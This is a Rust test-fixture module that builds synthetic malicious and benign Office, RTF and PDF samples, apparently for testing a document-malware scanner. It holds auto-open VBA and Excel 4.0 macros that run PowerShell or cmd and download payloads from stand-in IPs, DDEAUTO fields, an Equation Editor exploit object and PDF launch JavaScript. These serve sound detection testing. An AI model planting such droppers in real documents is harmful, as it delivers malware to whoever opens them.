//! Synthetic, self-contained malicious and benign documents for tests.
//!
//! Every fixture is generated from code so the test suite needs no binary
//! blobs and every byte of every sample is reviewable.

use arca_container::cfb::writer::CfbBuilder;
use arca_container::zip::writer::{Compression, ZipWriter};

use crate::ole::vba::tests::compress_literal;

pub(crate) const R_NS: &str = "http://schemas.openxmlformats.org/officeDocument/2006/relationships";
pub(crate) const W_NS: &str = "http://schemas.openxmlformats.org/wordprocessingml/2006/main";

pub(crate) const CT_DOCX: &str =
    "application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml";
pub(crate) const CT_DOCM: &str = "application/vnd.ms-word.document.macroEnabled.main+xml";
pub(crate) const CT_XLSX: &str =
    "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml";
pub(crate) const CT_XLSM: &str = "application/vnd.ms-excel.sheet.macroEnabled.main+xml";

/// In-memory OPC package.
#[derive(Clone, Debug, Default)]
pub(crate) struct Opc {
    parts: Vec<(String, Vec<u8>)>,
}

impl Opc {
    pub(crate) fn set(&mut self, name: &str, data: impl Into<Vec<u8>>) -> &mut Self {
        let data = data.into();
        if let Some(p) = self.parts.iter_mut().find(|(n, _)| n == name) {
            p.1 = data;
        } else {
            self.parts.push((name.to_owned(), data));
        }
        self
    }

    pub(crate) fn remove(&mut self, name: &str) -> &mut Self {
        self.parts.retain(|(n, _)| n != name);
        self
    }

    /// The parts in insertion order.
    pub(crate) fn entries(&self) -> &[(String, Vec<u8>)] {
        &self.parts
    }

    pub(crate) fn build(&self) -> Vec<u8> {
        let mut w = ZipWriter::new();
        for (n, d) in &self.parts {
            w.add(n, d, Compression::Deflated).unwrap();
        }
        w.finish().unwrap()
    }
}

pub(crate) fn rels(items: &[(&str, &str, &str, bool)]) -> String {
    let mut s = String::from(
        r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">"#,
    );
    for (id, ty, target, external) in items {
        let ty = if ty.starts_with("http") { (*ty).to_owned() } else { format!("{R_NS}/{ty}") };
        let mode = if *external { r#" TargetMode="External""# } else { "" };
        s.push_str(&format!(r#"<Relationship Id="{id}" Type="{ty}" Target="{target}"{mode}/>"#));
    }
    s.push_str("</Relationships>");
    s
}

pub(crate) fn content_types(overrides: &[(&str, &str)]) -> String {
    let mut s = String::from(
        r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Default Extension="xml" ContentType="application/xml"/><Default Extension="png" ContentType="image/png"/>"#,
    );
    for (part, ct) in overrides {
        s.push_str(&format!(r#"<Override PartName="{part}" ContentType="{ct}"/>"#));
    }
    s.push_str(r#"<Override PartName="/docProps/core.xml" ContentType="application/vnd.openxmlformats-package.core-properties+xml"/><Override PartName="/docProps/app.xml" ContentType="application/vnd.openxmlformats-officedocument.extended-properties+xml"/></Types>"#);
    s
}

pub(crate) fn core_props() -> String {
    r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?><cp:coreProperties xmlns:cp="http://schemas.openxmlformats.org/package/2006/metadata/core-properties" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:dcterms="http://purl.org/dc/terms/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><dc:title>Квартальный отчёт</dc:title><dc:creator>Иван Петров</dc:creator><cp:lastModifiedBy>i.petrov</cp:lastModifiedBy><cp:revision>7</cp:revision><dcterms:created xsi:type="dcterms:W3CDTF">2026-01-15T09:00:00Z</dcterms:created><dcterms:modified xsi:type="dcterms:W3CDTF">2026-02-01T18:30:00Z</dcterms:modified></cp:coreProperties>"#.to_owned()
}

pub(crate) fn app_props() -> String {
    r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?><Properties xmlns="http://schemas.openxmlformats.org/officeDocument/2006/extended-properties"><Template>Normal.dotm</Template><TotalTime>42</TotalTime><Application>Microsoft Office Word</Application><Company>ООО Ромашка</Company><Manager>А. Сидоров</Manager><AppVersion>16.0000</AppVersion></Properties>"#.to_owned()
}

pub(crate) fn document(body: &str) -> String {
    format!(
        r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?><w:document xmlns:w="{W_NS}" xmlns:r="{R_NS}" xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:v="urn:schemas-microsoft-com:vml"><w:body>{body}<w:sectPr/></w:body></w:document>"#
    )
}

pub(crate) fn para(text: &str) -> String {
    format!("<w:p><w:r><w:t xml:space=\"preserve\">{text}</w:t></w:r></w:p>")
}

/// A benign `.docx`.
pub(crate) fn docx() -> Opc {
    let mut o = Opc::default();
    o.set("[Content_Types].xml", content_types(&[("/word/document.xml", CT_DOCX), ("/word/settings.xml", "application/vnd.openxmlformats-officedocument.wordprocessingml.settings+xml")]))
        .set(
            "_rels/.rels",
            rels(&[
                ("rId1", "officeDocument", "word/document.xml", false),
                ("rId2", "http://schemas.openxmlformats.org/package/2006/relationships/metadata/core-properties", "docProps/core.xml", false),
                ("rId3", "extended-properties", "docProps/app.xml", false),
            ]),
        )
        .set("word/document.xml", document(&para("Привет, мир")))
        .set("word/_rels/document.xml.rels", rels(&[("rId1", "settings", "settings.xml", false)]))
        .set("word/settings.xml", format!(r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?><w:settings xmlns:w="{W_NS}" xmlns:r="{R_NS}"><w:zoom w:percent="100"/></w:settings>"#))
        .set("docProps/core.xml", core_props())
        .set("docProps/app.xml", app_props());
    o
}

/// Encodes `dir` stream records.
pub(crate) fn rec(out: &mut Vec<u8>, id: u16, data: &[u8]) {
    out.extend_from_slice(&id.to_le_bytes());
    out.extend_from_slice(&u32::try_from(data.len()).unwrap().to_le_bytes());
    out.extend_from_slice(data);
}

/// Builds the storages/streams of a VBA project under `prefix` (e.g. `""`
/// for `vbaProject.bin`, `"Macros"` for `.doc`, `"_VBA_PROJECT_CUR"` for `.xls`).
pub(crate) fn add_vba_project(b: &mut CfbBuilder, prefix: &str, modules: &[(&str, &str, bool)]) {
    add_vba_project_with(b, prefix, modules, true);
}

/// Like [`add_vba_project`]; `protected` writes the password-protection lines (`CMG`, `DPB`, `GC`)
/// of the `PROJECT` stream, which a project nobody locked does not have.
pub(crate) fn add_vba_project_with(
    b: &mut CfbBuilder,
    prefix: &str,
    modules: &[(&str, &str, bool)],
    protected: bool,
) {
    let p = |s: &str| if prefix.is_empty() { s.to_owned() } else { format!("{prefix}/{s}") };
    let mut dir = Vec::new();
    rec(&mut dir, 0x0001, &1u32.to_le_bytes());
    rec(&mut dir, 0x0002, &0x0419u32.to_le_bytes());
    rec(&mut dir, 0x0014, &0x0419u32.to_le_bytes());
    rec(&mut dir, 0x0003, &1251u16.to_le_bytes());
    rec(&mut dir, 0x0004, b"VBAProject");
    rec(&mut dir, 0x0005, b"");
    rec(&mut dir, 0x0040, b"");
    // PROJECTVERSION has a misleading size field.
    dir.extend_from_slice(&0x0009u16.to_le_bytes());
    dir.extend_from_slice(&4u32.to_le_bytes());
    dir.extend_from_slice(&1_234_567u32.to_le_bytes());
    dir.extend_from_slice(&3u16.to_le_bytes());
    rec(&mut dir, 0x000F, &u16::try_from(modules.len()).unwrap().to_le_bytes());
    rec(&mut dir, 0x0013, &0xFFFFu16.to_le_bytes());
    for (name, source, document) in modules {
        rec(&mut dir, 0x0019, name.as_bytes());
        let uni: Vec<u8> = name.encode_utf16().flat_map(u16::to_le_bytes).collect();
        rec(&mut dir, 0x0047, &uni);
        rec(&mut dir, 0x001A, name.as_bytes());
        rec(&mut dir, 0x0032, &uni);
        rec(&mut dir, 0x001C, b"");
        rec(&mut dir, 0x0048, b"");
        rec(&mut dir, 0x0031, &0u32.to_le_bytes());
        rec(&mut dir, 0x001E, &0u32.to_le_bytes());
        rec(&mut dir, 0x002C, &0xFFFFu16.to_le_bytes());
        rec(&mut dir, if *document { 0x0022 } else { 0x0021 }, b"");
        rec(&mut dir, 0x002B, b"");
        let cp1251: Vec<u8> =
            source.chars().map(|c| u8::try_from(u32::from(c)).unwrap_or(b'?')).collect();
        b.add_stream(&p(&format!("VBA/{name}")), compress_literal(&cp1251)).unwrap();
    }
    rec(&mut dir, 0x0010, b"");
    b.add_stream(&p("VBA/dir"), compress_literal(&dir)).unwrap();
    b.add_stream(&p("VBA/_VBA_PROJECT"), vec![0xCC, 0x61, 0xFF, 0xFF, 0x00, 0x00, 0x00]).unwrap();
    let mut project = String::from("ID=\"{00000000-0000-0000-0000-000000000000}\"\r\n");
    for (name, _, document) in modules {
        if *document {
            project.push_str(&format!("Document={name}/&H00000000\r\n"));
        } else {
            project.push_str(&format!("Module={name}\r\n"));
        }
    }
    project.push_str("Name=\"VBAProject\"\r\n");
    if protected {
        project.push_str("CMG=\"00\"\r\nDPB=\"0000\"\r\nGC=\"00\"\r\n");
    }
    b.add_stream(&p("PROJECT"), project.into_bytes()).unwrap();
}

pub(crate) const MALICIOUS_VBA: &str = "Attribute VB_Name = \"ThisDocument\"\r\nPrivate Sub Document_Open()\r\n    Dim s As Object\r\n    Set s = CreateObject(\"WScript.Shell\")\r\n    s.Run \"powershell -enc SQBFAFgA\", 0\r\n    URLDownloadToFile 0, \"http://198.51.100.23/stage2.exe\", Environ(\"TEMP\") & \"\\s.exe\", 0, 0\r\nEnd Sub\r\n";

/// `vbaProject.bin` with one auto-executing document module.
pub(crate) fn vba_project_bin() -> Vec<u8> {
    let mut b = CfbBuilder::new();
    add_vba_project(
        &mut b,
        "",
        &[
            ("ThisDocument", MALICIOUS_VBA, true),
            (
                "Helpers",
                "Attribute VB_Name = \"Helpers\"\r\nFunction Add(a, b)\r\n Add = a + b\r\nEnd Function\r\n",
                false,
            ),
        ],
    );
    b.finish().unwrap()
}

/// A `.docm` with an auto-executing VBA project.
pub(crate) fn docm_with_macro() -> Opc {
    docm_with_project(vba_project_bin())
}

/// A `.docm` whose VBA project has the given `(name, source, is a document module)` modules.
pub(crate) fn docm_with_modules(modules: &[(&str, &str, bool)]) -> Opc {
    let mut b = CfbBuilder::new();
    add_vba_project(&mut b, "", modules);
    docm_with_project(b.finish().unwrap())
}

/// A `.docm` whose VBA project nobody locked with a password.
pub(crate) fn docm_with_open_modules(modules: &[(&str, &str, bool)]) -> Opc {
    let mut b = CfbBuilder::new();
    add_vba_project_with(&mut b, "", modules, false);
    docm_with_project(b.finish().unwrap())
}

fn docm_with_project(project: Vec<u8>) -> Opc {
    let mut o = docx();
    o.set(
        "[Content_Types].xml",
        content_types(&[
            ("/word/document.xml", CT_DOCM),
            (
                "/word/settings.xml",
                "application/vnd.openxmlformats-officedocument.wordprocessingml.settings+xml",
            ),
            ("/word/vbaProject.bin", "application/vnd.ms-office.vbaProject"),
        ]),
    )
    .set("word/vbaProject.bin", project)
    .set(
        "word/_rels/document.xml.rels",
        rels(&[
            ("rId1", "settings", "settings.xml", false),
            (
                "rId9",
                "http://schemas.microsoft.com/office/2006/relationships/vbaProject",
                "vbaProject.bin",
                false,
            ),
        ]),
    );
    o
}

/// Complex DDE field split across runs (the form Word itself writes).
pub(crate) fn dde_body() -> String {
    format!(
        "{}<w:p><w:r><w:fldChar w:fldCharType=\"begin\"/></w:r><w:r><w:instrText xml:space=\"preserve\"> DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe </w:instrText></w:r><w:r><w:instrText xml:space=\"preserve\">\"/k calc.exe\" </w:instrText></w:r><w:r><w:fldChar w:fldCharType=\"separate\"/></w:r><w:r><w:t>Обновить связи</w:t></w:r><w:r><w:fldChar w:fldCharType=\"end\"/></w:r></w:p>",
        para("Счёт на оплату")
    )
}

/// DDE keyword hidden behind a nested `QUOTE` field.
pub(crate) fn dde_quote_body() -> &'static str {
    "<w:p><w:r><w:fldChar w:fldCharType=\"begin\"/></w:r><w:r><w:fldChar w:fldCharType=\"begin\"/></w:r><w:r><w:instrText> QUOTE 68 68 69 65 85 84 79 </w:instrText></w:r><w:r><w:fldChar w:fldCharType=\"separate\"/></w:r><w:r><w:t>DDEAUTO</w:t></w:r><w:r><w:fldChar w:fldCharType=\"end\"/></w:r><w:r><w:instrText> cmd \"/c calc\"</w:instrText></w:r><w:r><w:fldChar w:fldCharType=\"separate\"/></w:r><w:r><w:t>x</w:t></w:r><w:r><w:fldChar w:fldCharType=\"end\"/></w:r></w:p>"
}

/// A benign `.xlsx` with one sheet (plus optional extra sheets / defined names).
pub(crate) fn xlsx(sheet_xml: &str) -> Opc {
    let mut o = Opc::default();
    o.set(
        "[Content_Types].xml",
        content_types(&[
            ("/xl/workbook.xml", CT_XLSX),
            ("/xl/worksheets/sheet1.xml", "application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"),
        ]),
    )
    .set(
        "_rels/.rels",
        rels(&[
            ("rId1", "officeDocument", "xl/workbook.xml", false),
            ("rId2", "http://schemas.openxmlformats.org/package/2006/relationships/metadata/core-properties", "docProps/core.xml", false),
            ("rId3", "extended-properties", "docProps/app.xml", false),
        ]),
    )
    .set(
        "xl/workbook.xml",
        format!(r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?><workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="{R_NS}"><sheets><sheet name="Лист1" sheetId="1" r:id="rId1"/></sheets></workbook>"#),
    )
    .set("xl/_rels/workbook.xml.rels", rels(&[("rId1", "worksheet", "worksheets/sheet1.xml", false)]))
    .set(
        "xl/worksheets/sheet1.xml",
        format!(r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?><worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="{R_NS}"><sheetData>{sheet_xml}</sheetData></worksheet>"#),
    )
    .set("docProps/core.xml", core_props())
    .set("docProps/app.xml", app_props());
    o
}

/// An `.xlsm` with a very-hidden Excel 4.0 macro sheet and `Auto_Open`.
pub(crate) fn xlsm_with_xlm() -> Opc {
    let mut o = xlsx(r#"<row r="1"><c r="A1" t="str"><v>Hello</v></c></row>"#);
    o.set(
        "[Content_Types].xml",
        content_types(&[
            ("/xl/workbook.xml", CT_XLSM),
            ("/xl/worksheets/sheet1.xml", "application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"),
            ("/xl/macrosheets/sheet1.xml", "application/vnd.ms-excel.macrosheet+xml"),
        ]),
    )
    .set(
        "xl/workbook.xml",
        format!(r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?><workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="{R_NS}"><sheets><sheet name="Лист1" sheetId="1" r:id="rId1"/><sheet name="Macro1" sheetId="2" state="veryHidden" r:id="rId2"/></sheets><definedNames><definedName name="_xlnm.Auto_Open" hidden="1">Macro1!$A$1</definedName><definedName name="Total">Лист1!$A$1</definedName></definedNames></workbook>"#),
    )
    .set(
        "xl/_rels/workbook.xml.rels",
        rels(&[
            ("rId1", "worksheet", "worksheets/sheet1.xml", false),
            ("rId2", "http://schemas.microsoft.com/office/2006/relationships/xlMacrosheet", "macrosheets/sheet1.xml", false),
        ]),
    )
    .set(
        "xl/macrosheets/sheet1.xml",
        r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?><xm:macrosheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:xm="http://schemas.microsoft.com/office/excel/2006/main"><sheetData><row r="1"><c r="A1"><f>EXEC("cmd /c calc.exe")</f></c></row><row r="2"><c r="A2"><f>CALL("urlmon","URLDownloadToFileA","JJCCJJ",0,"http://203.0.113.9/p.dll","c:\\p.dll",0,0)</f></c></row><row r="3"><c r="A3"><f>HALT()</f></c></row></sheetData></xm:macrosheet>"#,
    );
    o
}

/// Builds a small `.doc`-like compound file with macros, metadata, an
/// Equation Editor object and a DDE field in the text.
pub(crate) fn doc_binary() -> Vec<u8> {
    let mut b = CfbBuilder::new();
    let mut wd = vec![0xEC, 0xA5, 0xC1, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00];
    wd.resize(0x400, 0);
    wd.extend_from_slice(b"Invoice text \x13 DDEAUTO cmd \"/c calc\" \x14Update\x15 end.");
    wd.resize(5000, 0);
    b.add_stream("WordDocument", wd).unwrap();
    b.add_stream("1Table", vec![0; 64]).unwrap();
    b.add_stream(
        "\u{5}SummaryInformation",
        crate::ole::propset::tests::summary_stream(
            &[(4, "Иван Петров"), (8, "Admin"), (18, "Microsoft Office Word")],
            125,
        ),
    )
    .unwrap();
    add_vba_project(&mut b, "Macros", &[("ThisDocument", MALICIOUS_VBA, true)]);
    let equation = [
        0x02, 0xCE, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x46,
    ];
    b.add_storage("ObjectPool/_1234567", equation).unwrap();
    b.add_stream(
        "ObjectPool/_1234567/Equation Native",
        vec![0x1C, 0, 0, 0, 2, 0, 0x9E, 0xC4, 0xA9, 0, 0, 0],
    )
    .unwrap();
    b.finish().unwrap()
}

/// RTF with an auto-updating Equation Editor object.
pub(crate) fn rtf_equation_exploit() -> Vec<u8> {
    let mut eq = CfbBuilder::new();
    eq.set_root_clsid([
        0x02, 0xCE, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x46,
    ]);
    eq.add_stream(
        "Equation Native",
        vec![0x1C, 0, 0, 0, 2, 0, 0x9E, 0xC4, 0xA9, 0, 0, 0, 0x41, 0x41, 0x41],
    )
    .unwrap();
    let native = eq.finish().unwrap();
    let mut ole1 = Vec::new();
    ole1.extend_from_slice(&0x0000_0501u32.to_le_bytes());
    ole1.extend_from_slice(&2u32.to_le_bytes());
    ole1.extend_from_slice(&11u32.to_le_bytes());
    ole1.extend_from_slice(b"Equation.3\0");
    ole1.extend_from_slice(&0u32.to_le_bytes());
    ole1.extend_from_slice(&0u32.to_le_bytes());
    ole1.extend_from_slice(&u32::try_from(native.len()).unwrap().to_le_bytes());
    ole1.extend_from_slice(&native);
    let hex: String = ole1.iter().map(|b| format!("{b:02x}")).collect();
    // Insert junk the way exploit kits do: whitespace and an ignorable group.
    let (a, z) = hex.split_at(40);
    format!("{{\\rtf1\\ansi{{\\info{{\\author Иван}}}}{{\\object\\objemb\\objupdate{{\\*\\objclass Equation.3}}\\objw380\\objh260{{\\*\\objdata {a}\n{{\\*\\arcajunk 0000}}{z}}}}}}}").into_bytes()
}

/// PDF with an `/OpenAction` and JavaScript hidden in a Flate object stream.
pub(crate) fn pdf_with_js() -> Vec<u8> {
    let inner = b"<< /Type /Action /S /JavaScript /JS (app.alert\\(\"pwned\"\\); this.exportDataObject\\({cName: \"x.exe\", nLaunch: 2}\\);) >>";
    let packed = miniz_oxide::deflate::compress_to_vec_zlib(inner, 6);
    let mut pdf = Vec::new();
    pdf.extend_from_slice(
        b"%PDF-1.7\n1 0 obj << /Type /Catalog /Pages 2 0 R /OpenAction 3 0 R >> endobj\n",
    );
    pdf.extend_from_slice(b"2 0 obj << /Type /Pages /Kids [] /Count 0 >> endobj\n");
    pdf.extend_from_slice(
        format!("3 0 obj << /Length {} /Filter /FlateDecode >>\nstream\n", packed.len()).as_bytes(),
    );
    pdf.extend_from_slice(&packed);
    pdf.extend_from_slice(b"\nendstream\nendobj\n4 0 obj << /Author (Ivan Petrov) /Producer (EvilPDF 1.0) >> endobj\ntrailer << /Root 1 0 R /Info 4 0 R >>\n%%EOF\n");
    pdf
}
